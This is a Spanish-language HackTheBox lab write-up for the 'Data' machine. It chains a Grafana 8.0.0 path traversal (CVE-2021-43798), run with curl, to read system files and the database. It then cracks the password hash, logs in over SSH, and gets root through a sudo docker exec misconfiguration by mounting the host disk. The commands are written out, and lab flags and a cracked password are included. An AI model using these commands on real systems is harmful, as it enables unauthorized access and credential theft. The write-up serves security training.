---
title: "Data"
machine: "Data"
platform: "HackTheBox"
os: "Linux"
difficulty: "Unknown"
tags: ["CVE", "SQLi", "Privesc", "Web"]
retired: true
summary: "IP del Objetivo: 10.129.234.47"
draft: false
---
# Writeup: Grafana - HackTheBox

**Dificultad:** Easy/Medium

**IP del Objetivo:** `10.129.234.47`

## 1. Descripción General

Esta máquina se centra en la explotación de una vulnerabilidad de **Path Traversal** conocida en el software de monitoreo **Grafana**, la posterior extracción de una base de datos **SQLite** para la obtención de credenciales y, finalmente, una escalada de privilegios abusando de permisos mal configurados en **Docker**.

---

## 2. Reconocimiento

### Escaneo de Puertos (Nmap)

El análisis inicial reveló dos puertos abiertos:

- **22/tcp (SSH):** OpenSSH 7.6p1 (Ubuntu).
- **3000/tcp (HTTP):** Servicio Grafana activo.

### Análisis Web

Al acceder al puerto 3000, se identificó la aplicación Grafana. Al revisar el **código fuente** de la página de inicio de sesión, se encontró el objeto `window.grafanaBootData`, que revelaba la versión exacta: **8.0.0**.

---

## 3. Acceso Inicial - Explotación de Grafana

### Vulnerabilidad: CVE-2021-43798

La versión **8.0.0** es vulnerable a un **Arbitrary File Read (Path Traversal)** a través de los endpoints de plugins.

**Explotación Manual:**
Se utilizó `curl` con el parámetro `--path-as-is` para leer el archivo `/etc/passwd`:

Bash

`curl --path-as-is http://10.129.234.47:3000/public/plugins/alertlist/../../../../../../../../etc/passwd`

El archivo confirmó la existencia del usuario **boris** y el usuario de servicio **grafana**.

### Extracción de Base de Datos

Consultando el archivo de configuración `/etc/grafana/grafana.ini`, se confirmó que el servicio utilizaba una base de datos **SQLite3** en la ruta por defecto `/var/lib/grafana/grafana.db`. Se procedió a descargarla:

Bash

`curl --path-as-is http://10.129.234.47:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db`

---

## 4. Obtención de Credenciales y User Flag

### Análisis de SQLite

Al abrir la base de datos localmente, se volcaron los hashes de la tabla `user`:

- **boris:** `dc6beccc...` (Salt: `LCBhdtJWjl`)

### Crackeo de Hashes

El hash utiliza **PBKDF2-HMAC-SHA256**. Se formateó para **Hashcat** (modo `10900`) convirtiendo el salt y el hash a Base64:

Bash

`hashcat -m 10900 grafana_hashes.txt rockyou.txt`

**Resultado:** `beautiful1`

### Acceso SSH

Se confirmó la reutilización de credenciales accediendo vía SSH:

Bash

`ssh boris@10.129.234.47
cat user.txt # Flag: 7d7b42dbde411d9ffe374b7cb736935f`

---

## 5. Escalada de Privilegios

### Enumeración de Sudo

El comando `sudo -l` reveló que el usuario **boris** puede ejecutar `docker exec` como root sin contraseña:
 `(root) NOPASSWD: /snap/bin/docker exec *`

### Escape de Contenedor

Aunque no se permitía listar contenedores con `docker ps`, se utilizó `ps aux` para encontrar el ID del contenedor de Grafana en ejecución:
`ID: e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488`

Se accedió al contenedor como root:

Bash

`sudo /snap/bin/docker exec -u 0 -it e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488 /bin/sh`

### Acceso al Host (Root Flag)

Dentro del contenedor, se identificaron los discos de la máquina host en `/dev/sda*`. Se montó la partición principal para leer la flag de root:

Bash

`mkdir /mnt/root_host
mount /dev/sda1 /mnt/root_host
cat /mnt/root_host/root/root.txt`

**Flag de Root:** `1ba45eb3047f4c7f8a5771c34538bddd`

---

## Resumen de la Cadena de Ataque

1. **Path Traversal** en Grafana 8.0.0 (CVE-2021-43798).
2. **Exfiltración** de la base de datos SQLite.
3. **Crackeo** de contraseña del usuario Boris (`beautiful1`).
4. **Movimiento Lateral** vía SSH.
5. **Abuso de Sudo** en `docker exec`.
6. **Montaje de disco** del host desde el contenedor para leer la flag de root.
